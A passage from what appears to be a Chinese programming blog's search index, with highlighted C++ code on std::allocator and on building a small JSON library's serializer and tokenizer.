class=\"line\"></span><br><span class=\"line\">    strAlloc.<span class=\"built_in\">construct</span>(++p, <span class=\"number\">5</span>, <span class=\"string\">&#x27;a&#x27;</span>); <span class=\"comment\">// &quot;aaaaa&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">assert</span>(*p == <span class=\"string\">&quot;aaaaa&quot;</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    strAlloc.<span class=\"built_in\">construct</span>(++p, <span class=\"string\">&quot;Hello&quot;</span>); <span class=\"comment\">// &quot;Hello&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">assert</span>(*p == <span class=\"string\">&quot;Hello&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    strAlloc.<span class=\"built_in\">destroy</span>(str + <span class=\"number\">1</span>);</span><br><span class=\"line\">    strAlloc.<span class=\"built_in\">construct</span>(str + <span class=\"number\">1</span>, <span class=\"string\">&quot;new string&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">assert</span>(*(str + <span class=\"number\">1</span>) == <span class=\"string\">&quot;new string&quot;</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">    strAlloc.<span class=\"built_in\">destroy</span>(str);</span><br><span class=\"line\">    strAlloc.<span class=\"built_in\">destroy</span>(str + <span class=\"number\">1</span>);</span><br><span class=\"line\">    strAlloc.<span class=\"built_in\">destroy</span>(str + <span class=\"number\">2</span>);</span><br><span class=\"line\">    strAlloc.<span class=\"built_in\">deallocate</span>(str, <span class=\"number\">3</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">TEST2</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    std::vector&lt;<span class=\"keyword\">int</span>&gt; vec &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>&#125;;</span><br><span class=\"line\">    std::allocator&lt;<span class=\"keyword\">int</span>&gt; intAlloc;</span><br><span class=\"line\">    <span class=\"keyword\">int</span>* p = intAlloc.<span class=\"built_in\">allocate</span>(<span class=\"number\">6</span>); <span class=\"comment\">// p = &#123; ?, ?, ?, ?, ?, ? &#125;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">int</span>* q = std::<span class=\"built_in\">uninitialized_copy</span>(vec.<span class=\"built_in\">begin</span>(), vec.<span class=\"built_in\">end</span>(), p); <span class=\"comment\">// p = &#123; 1, 2, 3, ?, ?, ? &#125;</span></span><br><span class=\"line\">    std::<span class=\"built_in\">uninitialized_fill_n</span>(q, <span class=\"number\">3</span>, <span class=\"number\">10</span>); <span class=\"comment\">// p = &#123; 1, 2, 3, 10, 10, 10&#125;;</span></span><br><span class=\"line\">    <span class=\"built_in\">assert</span>(*p == <span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"built_in\">assert</span>(*(p + <span class=\"number\">3</span>) == <span class=\"number\">10</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    intAlloc.<span class=\"built_in\">deallocate</span>(p, <span class=\"number\">6</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">TEST1</span>();</span><br><span class=\"line\">    <span class=\"built_in\">TEST2</span>();</span><br><span class=\"line\">    std::cout &lt;&lt; <span class=\"string\">&quot;SUCESS&quot;</span> &lt;&lt; std::endl;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://www.bilibili.com/video/BV15h41167wt?spm_id_from=333.337.search-card.all.click&amp;vd_source=7b12ced4d39cf756884de8d6e05af036\">std::allocator 是什么？重点不是“是什么”，而是“为什么”</a></li>\n<li><a href=\"https://en.cppreference.com/w/cpp/memory/allocator\">cpp reference: allocator</a></li>\n</ul>\n","tags":["C++"]},{"title":"深入理解文件快照","url":"/2022/07/10/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E6%96%87%E4%BB%B6%E5%BF%AB%E7%85%A7/","content":"<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://stackoverflow.com/questions/32441736/cow-vs-row-snapshot-technologies\">cow-vs-row-snapshot-technologies</a></li>\n<li><a href=\"https://blog.csdn.net/dalei9243/article/details/106628611\">什么是全量备份,增量备份,差异备份?</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/337088463\">什么是完全备份，差异备份，增量备份？</a></li>\n<li><a href=\"https://blog.csdn.net/weixin_43466473/article/details/88262084\">数据库全备份、差量备份和增量备份</a></li>\n<li><a href=\"https://support.huawei.com/enterprise/en/doc/EDOC1100200561\">COW and ROW Snapshot Working Principles</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/64595897\">存储系统的快照技术</a></li>\n</ul>\n","categories":["大话存储"],"tags":["快照"]},{"title":"用C++实现一个轻量级Json库","url":"/2022/11/27/%E7%94%A8C-%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E8%BD%BB%E9%87%8F%E7%BA%A7Json%E5%BA%93/","content":"<blockquote>\n<p>项目地址<a href=\"https://github.com/XUranus/minijson\">https://github.com/XUranus/minijson</a></p>\n</blockquote>\n<p>JSON是非常常用的结构对象序列化方式。相比于其他基于字节流的序列化方案（thrift，protobuff），JSON易于阅读和编辑；相较于同样基于文本的序列化方案XML，JSON在网络传输占用更小的空间。JSON很好平衡了序列化/反序列化的性能、可读性、空间占用的问题。</p>\n<p>很多语言都在标准库中添加了JSON相关的API，但C/C++还没有。C++较为完善的开源JSON库有jsoncpp。这篇文件将介绍如何用1K行左右的代码实现一个精简C++的Json库。</p>\n<span id=\"more\"></span>\n<p>在开始之前强烈建议读一下JSON官方描述<a href=\"https://www.json.org/json-en.html\">文档</a>，其中包含了JSON格式的详细定义，之后实现JSON解析的时候将会用得到。</p>\n<h3 id=\"接口设计\"><a href=\"#接口设计\" class=\"headerlink\" title=\"接口设计\"></a>接口设计</h3><p>一个JSON成员(JsonElement)可以是一个<code>null</code>、数字(number)、布尔值(bool)、字符串(string)这些基础类型；也可以是一个JSON数组(JsonArray)、JSON对象(JsonObject)这类复合类型。所以这6类类型可以看作<strong>是一个</strong><code>JsonElement</code>：</p>\n<p><pre class=\"mermaid\">flowchart TD\n    JsonElement --> null\n    JsonElement --> number\n    JsonElement --> bool\n    JsonElement --> string\n    JsonElement --> JsonObject\n    JsonElement --> JsonArray</pre><br><code>JsonElement</code>应该提供以下能力：</p>\n<ol>\n<li>记录自己对应的类型信息，并能转化成对应六种的类型之一</li>\n<li>提供统一序列化接口，对每一种类型分别实现序列化</li>\n</ol>\n<p>于是首先定义一个序列化接口，所有的<code>JsonElement</code>都应该实现这个接口。<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Serializable</span> &#123;</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> std::string <span class=\"title\">Serialize</span><span class=\"params\">()</span> <span class=\"keyword\">const</span> </span>= <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>可以定义一个<code>JsonElement</code>类，用枚举类型标记其是哪一种类型，并用联合体成员记存放其对应实际的值：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">JsonElement</span>:</span> <span class=\"keyword\">public</span> Serializable &#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">enum</span> <span class=\"keyword\">class</span> <span class=\"title\">Type</span> &#123;</span></span><br><span class=\"line\">      JSON_OBJECT,</span><br><span class=\"line\">      JSON_ARRAY,</span><br><span class=\"line\">      JSON_STRING,</span><br><span class=\"line\">      JSON_NUMBER,</span><br><span class=\"line\">      JSON_BOOL,</span><br><span class=\"line\">      JSON_NULL</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">union</span> <span class=\"title\">Value</span> &#123;</span></span><br><span class=\"line\">      JsonObject* objectValue;</span><br><span class=\"line\">      JsonArray* arrayValue;</span><br><span class=\"line\">      std::string* stringValue;</span><br><span class=\"line\">      <span class=\"keyword\">double</span> numberValue;</span><br><span class=\"line\">      <span class=\"keyword\">bool</span> boolValue;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\">std::string <span class=\"title\">Serialize</span><span class=\"params\">()</span> <span class=\"keyword\">const</span> <span class=\"keyword\">override</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">    Type m_type = Type::JSON_NULL;</span><br><span class=\"line\">    Value m_value &#123;&#125;;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure><br>其中基础类型number类型用<code>double</code>表示，用<code>bool</code>表示布尔值，<code>std::string</code>表示字符串。null类型不需要存放值，只需要在<code>m_type</code>中标记类型即可。对于复合类型JSON数组和JSON对象用对应的指针类型来存放。</p>\n<p>由于<code>JsonElement</code>需要提供对于各种类型的转换能力，需要定义从各种基础类型的构造方法，并提供转换成对应类型的<code>AsXXX()</code>和<code>ToXXX()</code>方法。在操作<code>JsonElement</code>对象时需要用<code>TypeName()</code>和<code>IsXXX()</code>判断<code>JsonElement</code>存放的的具体类型。API设计如下：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">JsonElement</span>:</span> <span class=\"keyword\">public</span> Serializable &#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"built_in\">JsonElement</span>();</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">explicit</span> <span class=\"title\">JsonElement</span><span class=\"params\">(JsonElement::Type type)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">explicit</span> <span class=\"title\">JsonElement</span><span class=\"params\">(<span class=\"keyword\">bool</span> value)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">explicit</span> <span class=\"title\">JsonElement</span><span class=\"params\">(<span class=\"keyword\">double</span> num)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">explicit</span> <span class=\"title\">JsonElement</span><span class=\"params\">(<span class=\"keyword\">long</span> num)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">explicit</span> <span class=\"title\">JsonElement</span><span class=\"params\">(<span class=\"keyword\">const</span> std::string &amp;str)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">explicit</span> <span class=\"title\">JsonElement</span><span class=\"params\">(<span class=\"keyword\">char</span> <span class=\"keyword\">const</span> *str)</span></span>;</span><br><span class=\"line\">    <span class=\"built_in\">JsonElement</span>(<span class=\"keyword\">const</span> JsonObject&amp; object);</span><br><span class=\"line\">    <span class=\"built_in\">JsonElement</span>(<span class=\"keyword\">const</span> JsonArray&amp; array);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">JsonElement</span>(<span class=\"keyword\">const</span> JsonElement&amp; ele);</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">explicit</span> <span class=\"title\">JsonElement</span><span class=\"params\">(JsonElement&amp;&amp; ele)</span></span>;</span><br><span class=\"line\">    JsonElement&amp; <span class=\"keyword\">operator</span> = (<span class=\"keyword\">const</span> JsonElement&amp; ele);</span><br><span class=\"line\">    ~<span class=\"built_in\">JsonElement</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">bool</span>&amp; <span class=\"title\">AsBool</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">double</span>&amp; <span class=\"title\">AsNumber</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span>* <span class=\"title\">AsNull</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span>;</span><br><span class=\"line\">    <span class=\"function\">std::string&amp; <span class=\"title\">AsString</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\">JsonObject&amp; <span class=\"title\">AsJsonObject</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\">JsonArray&amp; <span class=\"title\">AsJsonArray</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">ToBool</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">double</span> <span class=\"title\">ToNumber</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span>* <span class=\"title\">ToNull</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span>;</span><br><span class=\"line\">    <span class=\"function\">std::string <span class=\"title\">ToString</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span>;</span><br><span class=\"line\">    <span class=\"function\">JsonObject <span class=\"title\">ToJsonObject</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span>;</span><br><span class=\"line\">    <span class=\"function\">JsonArray <span class=\"title\">ToJsonArray</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">IsNull</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">IsBool</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">IsNumber</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">IsString</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">IsJsonObject</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">IsJsonArray</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\">std::string <span class=\"title\">TypeName</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span>;</span><br><span class=\"line\">    <span class=\"function\">std::string <span class=\"title\">Serialize</span><span class=\"params\">()</span> <span class=\"keyword\">const</span> <span class=\"keyword\">override</span></span>;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>复合类型的JSON对象(JsonObject)和JSON数组(JsonArray)可以包含JsonElement。<br>JsonObject可以看作KV结构的字典，Key是字符串，Value是JsonElement类型；JsonArray可以看成JsonElement构成的数组。于是这里分别选用继承<code>std::vector&lt;JsonElement&gt;</code>和<code>std::map&lt;std::string, JsonElement&gt;</code>来实现JsonArray和JsonObject：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">JsonObject</span>:</span> <span class=\"keyword\">public</span> std::map&lt;std::string, JsonElement&gt;, <span class=\"keyword\">public</span> Serializable &#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"function\">std::string <span class=\"title\">Serialize</span><span class=\"params\">()</span> <span class=\"keyword\">const</span> <span class=\"keyword\">override</span></span>;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">JsonArray</span>:</span> <span class=\"keyword\">public</span> std::vector&lt;JsonElement&gt;, <span class=\"keyword\">public</span> Serializable &#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"function\">std::string <span class=\"title\">Serialize</span><span class=\"params\">()</span> <span class=\"keyword\">const</span> <span class=\"keyword\">override</span></span>;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>具体API的实现代码有400多行，都是比较简单的逻辑判断。这里就不详述了，详细见：<a href=\"https://github.com/XUranus/minijson/blob/master/Json.cpp\">Json.cpp</a></p>\n<h3 id=\"序列化\"><a href=\"#序列化\" class=\"headerlink\" title=\"序列化\"></a>序列化</h3><p>有了基本的API设计和实现，就已经可以开始实现序列化了。序列化较为简单，只需要实现<code>JsonElement::Serialize()</code>、<code>JsonArray::Serialize()</code>和<code>JsonObject::Serialize()</code>方法。</p>\n<p><code>JsonElement::Serialize()</code>中实现五种基础类型的序列化，<code>null</code>和布尔值的<code>true</code>和<code>false</code>直接返回对应的字面量即可，数字类型可以用<code>std::to_string</code>直接获得字面量，然后删除末尾冗余的浮点0（详见<a href=\"https://github.com/XUranus/minijson/blob/master/Json.cpp\">Json.cpp</a>中<code>DoubleToString()</code>。字符串序列化需要前后带上引号，需要注意特殊字符的转义。<code>JsonObject</code>和<code>JsonArray</code>两种复合类型在对应自身的<code>Serialize()</code>中分别实现：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">std::string <span class=\"title\">JsonElement::Serialize</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\"><span class=\"keyword\">switch</span></span> (m_type) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> JsonElement::Type::JSON_NULL: &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;null&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> JsonElement::Type::JSON_BOOL: &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> m_value.boolValue ? <span class=\"string\">&quot;true&quot;</span> : <span class=\"string\">&quot;false&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> JsonElement::Type::JSON_NUMBER: &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">DoubleToString</span>(m_value.numberValue);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> JsonElement::Type::JSON_STRING: &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> std::<span class=\"built_in\">string</span>(<span class=\"string\">&quot;\\&quot;&quot;</span>) + <span class=\"built_in\">EscapeString</span>(*m_value.stringValue) + <span class=\"string\">&quot;\\&quot;&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> JsonElement::Type::JSON_OBJECT: &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">JsonObject</span>(*m_value.objectValue).<span class=\"built_in\">Serialize</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> JsonElement::Type::JSON_ARRAY: &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">JsonArray</span>(*m_value.arrayValue).<span class=\"built_in\">Serialize</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">Panic</span>(<span class=\"string\">&quot;unknown type to serialize: %s&quot;</span>, <span class=\"built_in\">TypeName</span>().<span class=\"built_in\">c_str</span>());</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>字符串转义需要考虑<code>&quot;</code>,<code>\\</code>,<code>/</code>,<code>\\f</code>,<code>\\b</code>,<code>\\n</code>,<code>\\r</code>,<code>\\t</code>这类字符，此处提供的实现如下：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">std::string <span class=\"title\">util::EscapeString</span><span class=\"params\">(<span class=\"keyword\">const</span> std::string&amp; str)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    std::string res;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> ch: str) &#123;</span><br><span class=\"line\">        <span class=\"built_in\"><span class=\"keyword\">switch</span></span> (ch) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">&#x27;&quot;&#x27;</span>:</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">&#x27;\\\\&#x27;</span>:</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">&#x27;/&#x27;</span>:</span><br><span class=\"line\">                res.<span class=\"built_in\">push_back</span>(<span class=\"string\">&#x27;\\\\&#x27;</span>);</span><br><span class=\"line\">                res.<span class=\"built_in\">push_back</span>(ch);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">&#x27;\\f&#x27;</span>: &#123;</span><br><span class=\"line\">                res.<span class=\"built_in\">push_back</span>(<span class=\"string\">&#x27;\\\\&#x27;</span>);</span><br><span class=\"line\">                res.<span class=\"built_in\">push_back</span>(<span class=\"string\">&#x27;f&#x27;</span>);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">&#x27;\\b&#x27;</span>: &#123;</span><br><span class=\"line\">                res.<span class=\"built_in\">push_back</span>(<span class=\"string\">&#x27;\\\\&#x27;</span>);</span><br><span class=\"line\">                res.<span class=\"built_in\">push_back</span>(<span class=\"string\">&#x27;b&#x27;</span>);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">&#x27;\\r&#x27;</span>: &#123;</span><br><span class=\"line\">                res.<span class=\"built_in\">push_back</span>(<span class=\"string\">&#x27;\\\\&#x27;</span>);</span><br><span class=\"line\">                res.<span class=\"built_in\">push_back</span>(<span class=\"string\">&#x27;r&#x27;</span>);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">&#x27;\\n&#x27;</span>: &#123;</span><br><span class=\"line\">                res.<span class=\"built_in\">push_back</span>(<span class=\"string\">&#x27;\\\\&#x27;</span>);</span><br><span class=\"line\">                res.<span class=\"built_in\">push_back</span>(<span class=\"string\">&#x27;n&#x27;</span>);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">&#x27;\\t&#x27;</span>: &#123;</span><br><span class=\"line\">                res.<span class=\"built_in\">push_back</span>(<span class=\"string\">&#x27;\\\\&#x27;</span>);</span><br><span class=\"line\">                res.<span class=\"built_in\">push_back</span>(<span class=\"string\">&#x27;t&#x27;</span>);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">default</span>: &#123;</span><br><span class=\"line\">                res.<span class=\"built_in\">push_back</span>(ch);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><code>JsonObject</code>序列化是一个遍历所有的KV对，递归调用字符串类型KEY和<code>JsonElement</code>类型的<code>JsonElement::Serialize</code>的过程：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">std::string <span class=\"title\">JsonObject::Serialize</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    std::string res = <span class=\"string\">&quot;&#123;&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">bool</span> moreThanOneItem = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> <span class=\"keyword\">auto</span>&amp; kv: *<span class=\"keyword\">this</span>) &#123;</span><br><span class=\"line\">        moreThanOneItem = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        res += std::<span class=\"built_in\">string</span>(<span class=\"string\">&quot;\\&quot;&quot;</span>) + <span class=\"built_in\">EscapeString</span>(kv.first) + <span class=\"string\">&quot;\\&quot;:&quot;</span> + kv.second.<span class=\"built_in\">Serialize</span>() + <span class=\"string\">&quot;,&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (moreThanOneItem) &#123;</span><br><span class=\"line\">        res.<span class=\"built_in\">pop_back</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    res += <span class=\"string\">&quot;&#125;&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><code>JsonArray</code>的序列化则是迭代调用所有数组成员类型<code>JsonElement::Serialize</code>的过程：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">std::string <span class=\"title\">JsonArray::Serialize</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    std::string res = <span class=\"string\">&quot;[&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">bool</span> moreThanOne = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> <span class=\"keyword\">auto</span>&amp; v: *<span class=\"keyword\">this</span>) &#123;</span><br><span class=\"line\">        moreThanOne = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        res += v.<span class=\"built_in\">Serialize</span>() + <span class=\"string\">&quot;,&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (moreThanOne) &#123;</span><br><span class=\"line\">        res.<span class=\"built_in\">pop_back</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    res += <span class=\"string\">&quot;]&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>写个Demo验证序列化成果：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">TEST</span>(SerializationTest, JsonBasicSerializationTest) &#123;</span><br><span class=\"line\">    JsonObject object &#123;&#125;;</span><br><span class=\"line\">    object[<span class=\"string\">&quot;name&quot;</span>] = <span class=\"built_in\">JsonElement</span>(<span class=\"string\">&quot;xuranus&quot;</span>);</span><br><span class=\"line\">    object[<span class=\"string\">&quot;age&quot;</span>] = <span class=\"built_in\">JsonElement</span>(<span class=\"number\">300.0</span>);</span><br><span class=\"line\">    object[<span class=\"string\">&quot;isDeveloper&quot;</span>] = <span class=\"built_in\">JsonElement</span>(<span class=\"literal\">true</span>);</span><br><span class=\"line\">    object[<span class=\"string\">&quot;skills&quot;</span>] = <span class=\"built_in\">JsonElement</span>(null);</span><br><span class=\"line\">    <span class=\"built_in\">EXPECT_EQ</span>(object.<span class=\"built_in\">Serialize</span>(), <span class=\"string\">R&quot;(&#123;&quot;age&quot;:300,&quot;name&quot;:&quot;xuranus&quot;, &quot;isDeveloper&quot;:true, &quot;skills&quot;:null&#125;)&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"反序列化\"><a href=\"#反序列化\" class=\"headerlink\" title=\"反序列化\"></a>反序列化</h3><h4 id=\"TOKEN\"><a href=\"#TOKEN\" class=\"headerlink\" title=\"TOKEN\"></a>TOKEN</h4><p>反序列化需要实现一个JSON字符串扫描和解析的模块，传入一个JSON字符串转为一个<code>JsonElement</code>。为了降低实现的复杂度，这里将解析的模块分成两块：</p>\n<ul>\n<li><code>JsonScanner</code>：逐字节扫描输入的字符串，依次识别一个个有意义的JSON语法TOKEN，并逐个返回</li>\n<li><code>JsonParser</code>：基于<code>JsonScanner</code>返回的TOKEN流，依据JSON的格式定义解析完整的JSON成员</li>\n</ul>\n<p>JSON的TOKEN是一个个较为简单的语法单位，这里定义如下的TOKEN:</p>\n<ul>\n<li><code>WHITESPACE</code>         : 空白符 (<code>&#39; &#39;</code>, <code>&#39;\\n&#39;</code>, <code>&#39;\\r&#39;</code>, 